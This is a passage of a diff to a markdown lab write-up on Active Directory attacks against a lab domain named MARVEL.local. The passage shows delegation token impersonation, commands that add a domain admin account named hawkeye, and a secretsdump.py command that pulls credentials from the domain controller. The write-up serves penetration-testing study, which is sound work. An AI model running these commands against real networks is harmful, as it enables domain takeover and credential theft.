@@ -46,20 +46,20 @@ This creates a delegation token for **MARVEL\Administrator** ..... as seen below
 ![Pasted image 20251218210958](images/Pasted-image-20251218210958.png)  
 
 
-This token can then be impersonated to get a shell with higher privilages
+This token can then be impersonated to get a shell with higher privilages  
 ![Pasted image 20251219185723](images/Pasted-image-20251219185723.png)  
 
 
 ### Proof of concept
 for a proof of concept that we have a really high privilage:
-	1) `net user /add hawkeye Password!@ /domain`
-	2) `net group "Domain Admins" hawkeye /ADD /DOMAIN`
-and this will create a user hawkeye with password as Password1@ and also give it domain admin privilages
+	1) `net user /add hawkeye Password!@ /domain`  
+	2) `net group "Domain Admins" hawkeye /ADD /DOMAIN`  
+and this will create a user hawkeye with password as Password1@ and also give it domain admin privilages  
 ![Pasted image 20251219202619](images/Pasted-image-20251219202619.png)  
 
-proof this worked:
-`secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136`
-secretsdump on DC should only work if done as a domain admin, so the above thing should work 
+proof this worked:  
+`secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136`  
+secretsdump on DC should only work if done as a domain admin, so the above thing should work   
 
 
 ## Mitigation
